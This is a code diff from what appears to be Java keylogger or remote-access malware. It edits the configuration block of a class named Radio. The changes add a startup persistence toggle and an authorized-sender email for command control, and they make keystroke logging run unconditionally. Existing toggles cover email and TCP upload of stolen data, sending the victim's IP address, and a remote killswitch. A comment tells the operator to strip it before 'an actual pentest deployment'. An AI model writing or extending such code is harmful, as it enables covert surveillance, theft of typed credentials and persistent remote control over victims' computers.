@@ -149,18 +149,26 @@ public class Radio
 	public static boolean uploadDone = false;
 	
 	/**
+	 * 
+	 * [ In an actual pentest deployment, after setting functions, ] 
+	 * [ please remove these helpful comments from the payload.    ] 
+	 * 
 	 * The following boolean values are toggle switches for various functions.
+	 * @string logKeystrokes toggles keystroke logging
+	 * @string doPersistance toggles persistance module (run at startup_
 	 * @boolean emailUpload toggles automatic mailer
 	 * @boolean emailReceive toggles email command control
 	 * @boolean socketUpload toggles socket TCP uploader
-	 * @boolean useStatIP toggles the usage of a static IP
+	 * @boolean useStatIP toggles the usage of a static IP for Socket Uploader
 	 * @boolean mailIPtrackers toggles the usage of sending WAN IP via email
 	 * @boolean checkForKill toggles the usage of remote killswitch at startup
 	 * @boolean verifyOS toggles the requirement of a Windows-based OS (if being run with WINE or ReactOS)
 	 * @string staticIP sets static IP addr to use if static IP is enabled
+	 * @string allowedMailer is the email that is authorized to send commands to the payload.
 	 */
 	
 	public static boolean logKeystrokes = true;
+	public static boolean doPersistance = true;
 	public static boolean emailUpload = true;
 	public static boolean emailReceive = true;
 	public static boolean socketUpload = false;
@@ -184,8 +192,6 @@ public class Radio
 		a = new Astatine();
 		AlphaDecay = new Thread(a);
 		Chocolat.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
-		if (logKeystrokes)
-		{
 			Executors.newSingleThreadExecutor().execute(new Runnable() {
 				@Override
 				public void run() {
@@ -198,8 +204,7 @@ public class Radio
 					}
 				}	
 			});
-			Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
-		}
+		Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Done.");
 		java.util.Date d = new java.util.Date();
 	    Calendar cl = Calendar.getInstance();
 	    cl.setTime(d);
